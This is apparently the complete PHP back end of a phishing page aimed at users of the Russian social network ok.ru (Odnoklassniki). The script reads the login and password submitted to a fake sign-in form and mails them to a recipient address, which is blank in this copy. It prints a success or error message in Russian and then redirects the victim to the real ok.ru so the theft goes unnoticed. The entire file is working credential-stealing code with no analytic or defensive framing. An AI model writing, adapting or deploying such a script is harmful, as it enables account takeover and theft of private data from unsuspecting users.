<?php

$ttext = 'Логин: '.$_POST['login']." ".' Пароль: '.$_POST['password'];

$sendemail = '';
$mail['from'] = ''; 
$mail['charset'] = 'utf-8';
$mail['subject'] = 'Данные для входа ok';

$mail['header'] = "MIME-Version: 1.0\n"
."From: " . $mail['from'] . "\n"
."X-Priority: 3\n"
."X-Mailer: Mailer\n"
."Content-Transfer-Encoding: 8bit\n"
."Content-Type: text/html; charset=" . $mail['charset'] . "\n";

if(mail($sendemail, $mail['subject'], $ttext, $mail['header'])) echo 'успешно';
else echo 'Ошибка';

header("Location: https://ok.ru/");
?>